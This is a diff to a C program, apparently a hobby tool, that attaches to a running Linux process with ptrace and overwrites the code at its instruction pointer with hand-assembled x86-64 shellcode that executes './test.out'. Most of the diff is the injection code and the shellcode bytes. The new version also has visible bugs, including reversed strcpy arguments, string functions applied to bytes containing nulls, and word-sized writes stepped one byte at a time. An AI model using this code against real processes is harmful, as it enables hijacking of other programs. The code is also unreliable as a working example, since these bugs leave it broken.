@@ -27,15 +27,16 @@
 
 #define __DEBUG__
 
+static char pathname[] = "./test.out";
+
 #ifdef __DEBUG__
 #  include<stdio.h> // to be commented out on commit
 #endif
 
-#define _GNU_SOURCE
-
-static char *pathname[] = "./test.out";
+#define __GNU_SOURCE
 
 #include<stdlib.h>
+#include<string.h>
 #include<sys/ptrace.h> /* ptrace() */
 #include<sys/reg.h> /* EIP, RIP */
 #include<sys/types.h> /* pid_t */
@@ -47,16 +48,19 @@ static char *pathname[] = "./test.out";
 #  define IP_REG RIP
 #  define PTR_T u_int64_t
 
-static u_int8_t shellcode1[] = {
-  0xb8, 0x3b, 0x00, 0x00, 0x00, // mov eax, 0x3b ; execve()
-  0x48, 0xbf                    // movabs rdi,
-};
-// *pathname[]
-static u_int8_t shellcode2[] = {
-  0x48, 0x31, 0xfb,             // xor rsi, rsi
-  0x48, 0x31, 0xd2,             // xor rdx, rdx
-  0x0f, 0x05,                   // syscall
-  0xcc                          // int3 ; ultimately sends SIGKILL
+static u_int8_t base_shellcode[] = {
+  0x48, 0x31, 0xc0,							// xor rax, rax
+  0x48, 0x31, 0xff,							// xor rdi, rdi
+  0x48, 0x31, 0xf6,							// xor rsi, rsi
+  0x48, 0x31, 0xd2,							// xor rdx, rdx
+  0x48, 0x8d, 0x3d, 0x25, 0x10, 0x10, 0x10,	// lea rdi, [rip+0x10101025]
+  0x48, 0x81, 0xef, 0x10, 0x10, 0x10, 0x10,	// sub rdi, 0x10101010
+  0xb0, 0x3b,								// mov al, 59 ; execve()
+  0x0f, 0x05,								// syscall
+  0x48, 0x31, 0xc0,							// xor rax,rax
+  0xb0, 0x3c,								// mov al, 60 ; exit()
+  0x48, 0x31, 0xff,							// xor rdi,rdi
+  0x0f, 0x05								// syscall
 };
 
 //#elif defined(__i836) // amd32
@@ -116,27 +120,18 @@ int main(int argc, char *argv[])
 
   attach(pid);
 
-  //perror("Status"); // to be commented out on commit
+  // appending `pathname` to shellcode
+
+  u_int8_t shellcode[sizeof(base_shellcode) + sizeof(pathname)];
+  strcpy(base_shellcode, shellcode);
+  strcat(shellcode, pathname);
 
   PTR_T ip = get_ip_reg(pid);
 
-  // storing `pathname`
-  // I'm just going to use the part of the .text section before the
-  // instruction pointer.
-
-  PTR_T pathname_addr = ip;
-
-  for(int i = sizeof(*pathname); i >= 0; i--)
+  for(int i = 0; i < sizeof(shellcode); i++)
   {
-    ptrace(PTRACE_POKETEXT, pid, pathname_addr + i, *pathname[sizeof(*pathname)-i]);
-  }
-
-  pathname_addr -= sizeof(*pathname);
-
-  for(int i = sizeof(shellcode1); i >= 0; i--)
-  {
-    ptrace(PTRACE_POKETEXT, pid, ip, shellcode[sizeof(shellcode)-i]);
-    ip--;
+    ptrace(PTRACE_POKETEXT, pid, ip, shellcode[i]);
+    ip++;
   }
 
   ptrace(PTRACE_CONT, pid, 0, 0);
